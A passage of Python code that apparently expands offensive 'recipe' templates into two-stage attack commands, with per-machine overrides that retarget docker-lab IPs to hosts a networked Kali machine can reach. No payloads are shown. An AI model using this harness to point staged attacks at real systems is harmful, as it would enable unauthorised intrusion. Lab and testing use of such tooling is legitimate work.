    ({"pathway", "target", "stage_1", "stage_2", "condition_check"}).
    `pathway` is `{template_id}__v{n}` so every concrete recipe has a
    distinct, traceable name back to its template and variation index.

    `target_overrides` (keyed by that same `{template_id}__v{n}` pathway
    name) lets a per-machine config replace a variation's values BEFORE
    substitution -- e.g. this repo's docker-lab IPs (172.x.x.x) are
    meaningless on a bare-metal networked Kali box's own network; that
    machine's own `pipeline_targets.json` remaps them to whatever it can
    actually reach. Applying the override after expansion (i.e. patching
    the already-substituted command string) would silently leave the OLD
    target baked into the text -- overrides must go into the variation
    dict itself, before `_substitute` runs."""
    target_overrides = target_overrides or {}
    recipes = []
    for template in templates:
        if template.get("retired"):
            # Excluded from the default candidate pool entirely -- kept
            # in this file, not deleted, because the LOGIC is still
            # real/correct, only the target went away (see the
            # template's own comment for why). Running it as-is would
            # just fail loudly against a target that no longer exists,
            # which is wasted cycles, not useful negative signal --
            # unlike a genuine stage_1_failed/stage_2_blocked row, this
            # was never actually attempted. Re-point `variations` at a
            # real target and remove this flag to bring it back.
            continue
        for i, variation in enumerate(template["variations"]):
            pathway = f"{template['template_id']}__v{i}"
            effective_variation = {**variation, **target_overrides.get(pathway, {})}
            recipe = {
                "pathway": pathway,
                "template_id": template["template_id"],
                "verified": template["verified"],
                "target": effective_variation.get("target", ""),
                "stage_1": _substitute(template["stage_1"], effective_variation),
                "stage_2": _substitute(template.get("stage_2", []), effective_variation),
            }
            if template.get("condition_check"):
                recipe["condition_check"] = _substitute(template["condition_check"], effective_variation)
            recipes.append(recipe)
    return recipes


def all_recipes(target_overrides=None):
    return (
        expand_templates(SINGLE_STAGE_TEMPLATES, target_overrides)
        + expand_templates(TWO_STAGE_TEMPLATES, target_overrides)
    )
